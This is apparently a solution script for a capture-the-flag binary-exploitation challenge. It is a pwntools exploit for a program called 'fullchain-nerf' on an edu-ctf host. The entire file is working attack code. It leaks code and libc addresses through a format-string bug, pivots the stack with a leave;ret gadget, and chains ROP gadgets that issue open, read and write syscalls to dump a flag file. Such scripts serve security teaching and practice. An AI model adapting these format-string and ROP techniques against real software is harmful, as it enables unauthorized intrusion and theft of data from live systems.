#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('edu-ctf.zoolab.org', 30206)
else:
    r = process('./fullchain-nerf')

r.sendlineafter('global or local > ', 'local')
r.sendlineafter('set, read or write > ', 'write-%6$p-%19$p')
r.recvuntil('write-')
data = r.recvuntil('global', drop=True).split(b'-')
code = int(data[0], 16) - 0x1670
libc = int(data[1], 16) - 0x270b3
info(f"libc: {hex(libc)}")
info(f"code: {hex(code)}")
flag_path = code + 0x2093
global_addr = code + 0x40a0
bss = code + 0x4000

rop_pop_rdi_ret = libc + 0x26b72
rop_pop_rsi_ret = libc + 0x27529
rop_pop_rax_ret = libc + 0x4a550
rop_pop_rdx_ret = libc + 0xe4942
rop_pop_rdx_rbx_ret = libc + 0x162866
rop_syscall_ret = libc + 0x66229
rop_leave_ret = libc + 0x5aa48

r.sendline('global')
r.sendlineafter('set, read or write > ', 'read')
r.sendlineafter('length > ', str(0x60))
# stack pivoting
ROP1 = flat(
    rop_leave_ret,
)
# read more ROP
ROP2 = flat(
    rop_pop_rax_ret, 0,
    rop_pop_rdi_ret, 0,
    rop_pop_rsi_ret, global_addr + 10*0x8,
    rop_pop_rdx_rbx_ret, 0x150, 1,
    rop_syscall_ret,
)
# orw
ROP3 = flat(
    rop_pop_rax_ret, 2,
    rop_pop_rdi_ret, flag_path,
    rop_pop_rsi_ret, 0,
    rop_syscall_ret,

    rop_pop_rax_ret, 0,
    rop_pop_rdi_ret, 3,
    rop_pop_rsi_ret, bss,
    rop_pop_rdx_rbx_ret, 0x30, 1,
    rop_syscall_ret,

    rop_pop_rax_ret, 1,
    rop_pop_rdi_ret, 1,
    rop_syscall_ret,
)

input()
r.send(ROP2)
r.sendlineafter('global or local > ', 'local')
r.sendlineafter('set, read or write > ', 'read')
r.sendlineafter('length > ', str(0x60))
r.send(b'\x00'*0x30 + p64(global_addr - 8) + ROP1)
input()
r.send(ROP3)

r.interactive()